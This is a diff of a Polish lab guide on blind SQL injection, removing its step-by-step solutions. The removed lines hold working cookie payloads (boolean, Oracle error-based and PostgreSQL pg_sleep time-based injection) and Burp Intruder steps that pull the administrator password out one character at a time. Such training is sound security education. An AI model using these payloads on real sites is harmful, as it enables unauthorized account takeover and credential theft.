@@ -40,37 +40,6 @@ Aby rozwiązać zadanie, zaloguj się jako użytkownik **administrator**.
     </li>
   </ol>
 </details>
-
-<details>
-  <summary>Krok po kroku</summary>
-  <ol>
-    <li> Z włączonym w tle Burpem wejdź na stronę sklepu  </li>
-    <li> Znajdź w żądaniu taką linijkę „Cookie: TrackingId=jakaś_zawartość; session=jakaś_zawrtość” </li>
-    <li> Zmodyfikuj  Cookie: TrackingId=jakaś_zawartość<b>' AND '1'='1</b>; session=jakaś_zawrtość” - sprawdź czy występuje jakiś komunikat </li>
-    <li>Zmodyfiikuj jedną "1" na dowolny inny znak - sprawdź czy strona reaguje prawidłowa</li>
-    <li>Wyślij zapytanie, nad którym pracujesz, do Burp Intrudera</li>
-    <li>W zakładce Positions programu Burp Intruder wyczyść domyślne pozycje klikając na przycisk "Clear §".</li>
-    <li> Zmodyfikuj  Cookie: TrackingId=jakaś_zawartość<b>' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH (password)>1)='a</b>; session=jakaś_zawrtość” </li>
-    <li>Umieść znacznik "Add §"  wokół znaku '1' w wartości cookie. </li>
-    <li>Przejdź do zakładki Payloads w polu Payload type wybierz Numbers</li>
-    <li>Poniżej w polu Payload Options wybierz zakres od 1 do 30 i krok 1</li>
-    <li>Następnie przejdź do zakładki Options i w polu Grep-Match naciśnij Clear, potem wpisz    <b>Welcome back</b> i kliknij Add </li>
-    <li>Rozpocznij atak - długość hasła to liczba przy której nie pojawi się już komunikat <b>Welcome back</b></li>
-    <li>Przejdź ponownie do zakładki Positions i zastąp wcześniej dodane zapytanie SQL następującym <b>' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a</b>
-      <br/>
-    Wykorzystuje to funkcję SUBSTRING() do wyodrębnienia pojedynczego znaku z hasła i przetestowania go względem określonej wartości. Nasz atak będzie cyklicznie przechodził przez każdą pozycję i możliwą wartość, testując każdą z nich po kolei.</li>
-    <li>Umieść znacznik "Add §"  wokół znaku 'a' w wartości cookie.</li>
-    <li>Przejdź do zakładki Payloads w polu Payload type wybierz Simple list</li>
-    <li>Poniżej w polu Payload Options dodaj plik do którego link umieszczony został w tym zadaniu</li>
-    <li>Jeśli wszytko się zgadza rozpocznij atak</li>
-    <li>Znak przy którym się pojawi komunikat <b>Welcome back</b> jest pierwszą literą hasła</li>
-    <li>Przejdź ponownie do zakładki Positions i w funkcji <b>SUBSTRING(password,1,1)</b> zamień pierwszą 1 na 2: <b>SUBSTRING(password,2,1)</b> </li>
-    <li>Rozpocznij ponownie atak </li>
-    <li>Znak przy którym się pojawi komunikat <b>Welcome back</b> jest drugą literą hasła</li>
-    <li>Postępuj analogicznie inkrementując do warości będącej długością hasła</li>
-    <li>Jeśli masz już całe hasło zaloguj się na konto administratora używając loginu <b>administrator</b> i hasła które już posiadasz</li>
-  </ol>
-</details>
 <br/>
 
 
@@ -103,29 +72,6 @@ Długość hasła jest identyczna co w poprzednim zadaniu.
     </li>
   </ol>
 </details>
-
-<details>
-  <summary>Krok po kroku</summary>
-  <ol>
-    <li>Z włączonym w tle Burpem wejdź na stronę sklepu </li>
-    <li>Znajdź w żądaniu taką linijkę „Cookie: TrackingId=jakaś_zawartość; session=jakaś_zawrtość” </li>
-    <li>Zacznijmy od określenia z jakiej bazy danych korzysta aplikacja.</li>
-    <li>Zmodyfikuj zapytanie „Cookie: TrackingId=jakaś_zawartość<b>' ||(SELECT '')||'</b>; session=jakaś_zawrtość”</li>
-    <li>Strona wysłała komunikat o błędzie, próbujemy dalej zamień teraz zapytanie SQL na <b>' ||(SELECT '' FROM dual)||'</b></li>
-    <li>Ponieważ nie otrzymałeś już błędu, wskazuje to, że używana jest  baza danych Oracle, (wymaga, aby wszystkie instrukcje SELECT zawierały nazwę tabeli.)</li>
-    <li>Wyślij zapytanie, nad którym pracujesz, do Burp Intrudera</li>
-    <li>W zakładce Positions programu Burp Intruder wyczyść domyślne pozycje klikając na przycisk "Clear §".</li>
-    <li> Zmodyfikuj  Cookie: TrackingId=jakaś_zawartość<b>' ||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</b>; session=jakaś_zawrtość” </li>
-    <li>Umieść znacznik "Add §"  wokół znaku 'a' w wartości cookie. </li>
-    <li>Przejdź do zakładki Payloads w polu Payload type wybierz Simple list</li>
-    <li>Poniżej w polu Payload Options dodaj listę znaków występujących w haślę </li>
-    <li>Rozpocznij atak - obserwuj kody błedu</li>
-    <li>Przejdź ponownie do zakładki Positions i w funkcji <b>SUBSTRING(password,1,1)</b> zamień pierwszą 1 na 2: <b>SUBSTRING(password,2,1)</b> </li>
-    <li>Rozpocznij ponownie atak </li>
-    <li>Postępuj analogicznie inkrementując do wartości będącej długością hasła</li>
-    <li>Jeśli masz już całe hasło zaloguj się na konto administratora używając loginu <b>administrator</b> i hasła które już posiadasz</li>
-  </ol>
-</details>
 <br/>
 <br/>
 
@@ -156,15 +102,6 @@ Zadanie polega na wykorzystaniu podatności SQLi w celu spowodowania 10 sekundow
   </ol>
 </details>
 
-<details>
-  <summary>Krok po kroku</summary>
-  <ol>
-    <li> Z włączonym w tle Burpem wejdź na stronę sklepu  </li>
-    <li> Znajdź w żądaniu taką linijkę „Cookie: TrackingId=jakaś_zawartość; session=jakaś_zawrtość” </li>
-    <li> Zmodyfikuj  Cookie: TrackingId=jakaś_zawartość<b>’ ||pg_sleep(10)--</b>; session=jakaś_zawrtość” </li>
-    <li> Wyślij żądanie i poczekaj 10 s </li>
-  </ol>
-</details>
 <br/>
 
 ### Zadanie 3.2 
@@ -197,31 +134,7 @@ W tym zadaniu musisz się zalogować na konto  <b>administrator</b>. Dla ułatwi
   </ol>
 </details>
 
-<details>
-  <summary>Krok po kroku</summary>
-  <ol>
-    <li> Z włączonym w tle Burpem wejdź na stronę sklepu  </li>
-    <li> Znajdź w żądaniu taką linijkę „Cookie: TrackingId=jakaś_zawartość; session=jakaś_zawrtość” </li>
-    <li> Najpierw sprawdźmy czy użytkownik "administrator" istnieje wklejając poniższą linijkę w tą samo miejsce co w poprzednim zadaniu
-      <br/>
-    ' %3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</li>
-    <li>Jeśli strona odpowiada po dłuższym czasie (10s) znaczy to że użytkownik istnieje</li>
-    <li>Zamień teraz nazwę użytkownika "administrator" i zauważ że strona odpowiada natychmiastowo</li>
-    <li>Demonstruje to, jak można przetestować pojedynczy warunek i wywnioskować wynik.</li>
-    <li>Wyślij zapytanie, nad którym pracujesz, do Burp Intrudera</li>
-    <li>W zakładce Positions programu Burp Intruder wyczyść domyślne pozycje klikając na przycisk "Clear §".</li>
-    <li>Zmień wartość cookie na: TrackingId=x' %3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</br></li>
-    <li>Umieść znacznik "Add §"  wokół znaku 'a' w wartości cookie.</li>
-    <li>Przejdź do zakładki Payloads, sprawdź czy wybrana jest opcja "Simple list", a następnie w zakładce "Payload Options" dodaj znaki z pliku do którego link znajduję się w tym zadaniu (plik identyczny co w poprzednich zadaniach)</li>
-    <li>Aby móc stwierdzić, kiedy właściwy znak został wysłany, będziesz musiał monitorować czas potrzebny aplikacji na odpowiedź na każde żądanie. Aby proces ten był jak najbardziej niezawodny, musisz skonfigurować atak Intrudera tak, aby wysyłał żądania w pojedynczym wątku. Aby to zrobić, przejdź do zakładki Resource Pool i dodaj atak do puli zasobów (na dole strony) z ustawionym parametrem "Maximum concurrent requests" na 1.</li>
-    <li>Rozpocznij atak obserwując wyraźnie zauważalne opóźnienie w przypadku jednego znaku - zanotuj go </li>
-    <li>Podczas sprawdzania kolejnych liter na górze pojawiło się menu <b>Columns</b> zaznacz w nim <b>Response received</b> - ułatwi to w znacznym stopniu pracę </li>
-    <li>Opóźnienie rzędu 10000 i powyżej oznacza że tego znaku oczekujemy.</li>
-    <li>Po zakończeniu pierwszej rundy przejdź do zakładki Positions i zmień argument funkcji "Subsrting" z 1 na 2 SUBSTRING(password,<b>2</b>,1)</li>
-    <li>Postępuj analogicznie inkrementując wartość do 20</li>
-  <li>Zaloguj się na konto administratora używając loginu <b>administrator</b> i hasła które już znasz</li>
-  </ol>
-</details>
+
 <br/>
 
 
